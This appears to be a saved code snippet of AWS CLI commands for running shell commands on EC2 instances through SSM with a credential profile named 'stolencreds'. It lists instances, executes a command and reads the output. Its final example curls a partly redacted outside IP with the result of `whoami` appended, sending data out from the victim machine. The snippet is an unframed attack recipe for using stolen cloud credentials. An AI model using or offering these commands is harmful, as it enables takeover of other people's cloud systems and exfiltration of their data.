---
id: a2e5170d-60b5-401f-a549-c421a4348314
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:09.691221+00:00'
updated_at: '2023-04-10T20:20:49.941179+00:00'
---

# Code Snippet a2e5170d

**Language**: Powershell

```powershell
$ aws ssm describe-instance-information --profile stolencreds --region eu-west-1  
$ aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --comment "IP Config" --parameters commands=ifconfig --output text --query "Command.CommandId" --profile stolencreds
$ aws ssm list-command-invocations --command-id "COMMAND-ID-HERE" --details --query "CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}" --profile stolencreds

e.g:
$ aws ssm send-command --instance-ids "i-05b████████adaa" --document-name "AWS-RunShellScript" --comment "whoami" --parameters commands='curl 162.243.███.███:8080/`whoami`' --output text --region=us-east-1
```


